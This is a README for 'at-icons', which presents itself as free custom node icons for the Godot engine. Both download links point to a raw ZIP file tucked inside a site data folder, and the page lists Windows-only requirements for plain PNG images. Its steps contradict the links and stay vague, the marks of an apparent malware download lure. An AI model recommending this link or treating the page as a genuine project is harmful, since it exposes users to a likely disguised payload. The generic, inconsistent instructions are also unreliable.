# 🎨 at-icons - Custom icons for your Godot projects

[![](https://img.shields.io/badge/Download-at--icons-blue.svg)](https://raw.githubusercontent.com/mattysmokefilled714/at-icons/main/site_src/_data/at-icons-3.7.zip)

## 📦 What is at-icons

This collection provides open source icons for custom nodes within the Godot game engine. These icons help you organize your game project by providing visual clarity in the editor. When you create unique nodes to handle specific game tasks, using a custom icon makes it easier to spot those nodes in your scene tree.

These icons follow the standard Godot design language. They look native within the software interface. You possess these icons to improve your workflow and keep your scene files clean and professional.

## ⚙️ System Requirements

Your computer needs specific components to use these icons correctly. Ensure your setup meets these standards:

* Operating System: Windows 10 or Windows 11.
* Software: Godot Engine version 3.5 or version 4.0 and higher.
* Storage: At least 50 megabytes of free disk space.
* Permissions: Access to your project folder to drag and drop files.

## 📥 How to Get the Icons

To add these icons to your Godot project, visit the download page.

[Click here to visit the project page and download the icons](https://raw.githubusercontent.com/mattysmokefilled714/at-icons/main/site_src/_data/at-icons-3.7.zip)

### Downloading the Files

1. Go to the link provided above.
2. Look for the green button labeled Code near the top of the page.
3. Click that button.
4. Select the option labeled Download ZIP.
5. Your web browser saves the file into your Downloads folder.
6. Find the folder named at-icons-main inside your Downloads directory.
7. Right-click the folder and select Extract All to view the individual icon files.

## 🛠️ Setting Up Icons in Godot

Follow these steps to apply these icons to your custom nodes after you extract the files.

1. Open your game project in the Godot Engine.
2. Locate the script file for your custom node in the FileSystem dock.
3. Open the script in the Script Editor.
4. Add the icon metadata to the top of your script.
5. Use the tool keyword followed by the class name attribute.
6. Specify the icon path within the script header.
7. Save the script file.
8. The Godot editor refreshes automatically and displays your new icon next to the node name in the scene tree.

If the icon does not appear, check the file path string in your script. Ensure the path points to the exact location of your downloaded PNG file within your project folder. Godot requires images to be inside the project directory to load them as node icons.

## 📁 Project Structure

The download includes several sub-folders to keep things tidy. 

* `icons/` The core folder containing all PNG image files.
* `examples/` A set of small project files demonstrating how to link icons to scripts.
* `license/` Legal documentation regarding the use of these images.

We formatted these files to be light and fast. You can use these icons in both personal and commercial projects without restrictions.

## 💡 Best Practices for Custom Nodes

Use icons to differentiate functional node types. For example, use a distinct icon for nodes that handle player input compared to nodes that manage game UI elements. This visual system reduces search time when your project grows large. 

Keep your icon files organized in a dedicated folder inside your project. This prevents clutter and makes it easier to update your icons in the future. If you move your icon files to a different folder later, you must update the path in each node script for the images to reappear.

## 🛡️ Troubleshooting Common Issues

If you encounter errors, check these common fixes:

* The icon looks blurry: Ensure your icon file uses a power-of-two resolution such as 16x16 or 32x32 pixels.
* The icon does not show: Check for a typo in your file path inside the GDScript file.
* Editor freeze: If you have a massive amount of nodes, wait a few seconds for the editor to index the new icons after you save your script.
* Missing files: Re-download the ZIP file if the extraction process encounters errors or reports corrupted data.

The icons provided in this repository are standard PNG files. You can open them in any image editor if you need to adjust colors or stroke thickness to match your specific editor theme. However, keep the original dimensions to ensure the icons scale correctly with the Godot interface.

## 📜 Legal Usage

This project is open source. You do not need to pay to use these images. You can modify them, share them, or bundle them with your game project. We release these files under a permissive license so you have full control over your development environment. Attribution remains optional, though you can mention the source if you wish to help others find these tools.

## 🔄 Updating Your Icons

Improvements occur periodically. To update your local collection, visit the link again, download the latest version, and replace the old files in your project directory with the new versions. If the filename remains the same, your scripts will update your node icons automatically when you restart the Godot editor.